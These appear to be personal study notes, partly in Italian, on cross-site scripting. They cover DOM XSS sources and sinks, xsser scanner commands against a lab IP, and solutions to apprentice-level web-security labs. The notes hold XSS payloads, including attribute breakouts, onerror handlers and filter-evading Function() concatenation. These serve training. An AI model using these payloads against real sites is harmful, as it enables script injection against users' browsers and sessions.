

```
### XSS Vulnerabilities:


# XSS - DOM:
Lo scripting cross-site basato su DOM si verifica quando il codice JavaScript accetta l'input di un utente (source) e lo passa a un'altra funzione che visualizza i risultati nella pagina (sink) in modo non sicuro.

- Source
A source function is any JS property or function that accepts user input from somewhere on the page. An example of a source is the location.search property because it reads input from the query string.
> "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI", "location.search", "document.cookie", "document.referrer".

- Sink
A sink is a potentially dangerous JavaScript function that can caused undesirable effects if attacker controlled data is passed to it. Basically, if the function returns input back to the screen as output without security checks, it’s considered a sink. An example of this would be the “innerHTML” property used earlier as that changes the contents of the HTML page to whatever is given to it.
> "document.write()", "document.writeln()", "document.domain", "element.innerHTML", "element.outerHTML", "element.insertAdjacentHTML", "element.onevent".



```

```
### XSS General:

```

```
### XSS Tools:

> xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

> xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --auto

> xsser --url 'http://192.131.167.3/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>"

```


```
### XSS Lab Apprentice:

#1. Lab: Reflected XSS into HTML context with nothing encoded:
#1. <script>alert(1)</script>



#2. Lab: Stored XSS into HTML context with nothing encoded:
#2. <script>alert(1)</script>



#3. Lab: DOM XSS in document.write sink using source location.search:
DOM uses JavaScript "document.write" function, which writes data out to the page. 
The "document.write" function is called with data from "location.search", which you can control using the website URL.
Break out of the img attribute by searching for:

#3.
<img src="/resources/images?searchTerms=abcd">
<img src="/resources/images?searchTerms=""><svg onload=alert(1)>



#4. Lab: DOM XSS in innerHTML sink using source location.search:
DOM based search blog uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

#4. <img src=1 onerror=alert(1)>



#5. DOM XSS in jQuery anchor href attribute sink using location.search source



```

```
### XSS Lab Practitioner
```

```
### XSS Lab Expert
```

```
### XSS Lab Extra:
?id=2646854";toDay='aler';aMonthAgo='t(1)';Function(toDay+aMonthAgo)()//-"d
?id=2646854";Function('aler'.concat('t(1));"

```